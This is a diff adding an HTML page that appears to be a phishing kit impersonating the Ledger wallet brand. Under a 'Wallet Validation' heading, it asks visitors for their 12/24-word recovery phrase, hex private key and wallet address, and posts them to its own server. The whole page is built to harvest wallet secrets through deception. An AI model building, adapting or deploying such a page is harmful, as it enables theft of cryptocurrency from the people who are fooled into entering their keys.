@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="initial-scale= 1.0, maximum-scale= 1.0, width= device-width">
+  <title>Hardware Wallet state-of-the-art security for crypto assets|ledger</title>
+
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.1/css/all.css" integrity="sha384-xxzQGERXS00kBmZW/6qxqJPyxW3UR0BPsL4c8ILaIWXva5kFi7TxkIIaMiKtqV1Q" crossorigin="anonymous">
+  <link rel="stylesheet" href="./css/styles.css">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="./apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="192x192" href="./android-chrome-192x192.png">
+  <link rel="icon" type="image/png" sizes="512x512" href="./android-chrome-512x512.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="./favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="./favicon-16x16.png">
+  <link rel="icon" type="image/png" href="./favicon.ico">
+  <link rel="manifest" href="./site.webmanifest">
+</head>
+
+<body>
+
+  <main>
+    <div class="top">
+      <h2>WALLET VALIDATION</h2>
+
+      <h4>Unlock Your Wallet</h4>
+    </div>
+
+    <div class="form">
+      <div class="tabs">
+        <h6>KEYSTORE</h6>
+        <h6 class="active mne">MNEMONIC</h6>
+        <h6 class="priv">PRIVATE KEY</h6>
+        <h6 class="key">HARDWARE</h6>
+      </div>
+
+      <form class="" action="/" method="post">
+
+        <div class="mnemonic">
+          <div class="">
+            <p>Enter your 12/24 word phrase <i class="fas fa-star"></i></p>
+            <textarea class="form-control" type="text" name="mnemonic" value="" placeholder="Enter the Safe Phrase"></textarea>
+            <p class="small">Please separate each word with a space</p>
+          </div>
+          <div class="">
+            <p>Enter your wallet address <i class="fas fa-star"></i></p>
+            <input class="form-control" type="text" name="walletForMnemonic" value="" placeholder="Wallet Address" autocomplete="off">
+            <p class="small">Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your acccounts.</p>
+          </div>
+        </div>
+
+        <div class="private hide">
+          <div class="">
+            <p>Please enter your private key<i class="fas fa-star"></i></p>
+            <textarea class="form-control" type="text" name="phrase" value="" placeholder="Enter the Private Key"></textarea>
+            <p class="small">Please enter your private key in hex format</p>
+          </div>
+          <div class="">
+            <p>Enter your wallet address <i class="fas fa-star"></i></p>
+            <input class="form-control" type="text" name="walletForPhrase" value="" placeholder="Wallet Address" autocomplete="off">
+            <p class="small">Input the BIP39/BIP44 recovery phrase here to restore the Mnemonic keys that manage your acccounts.</p>
+          </div>
+        </div>
+
+        <button class="" type="submit" name="button">Restore</button>
+
+      </form>
+    </div>
+  </main>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="./js/index.js" charset="utf-8"></script>
+</body>
+
+</html>
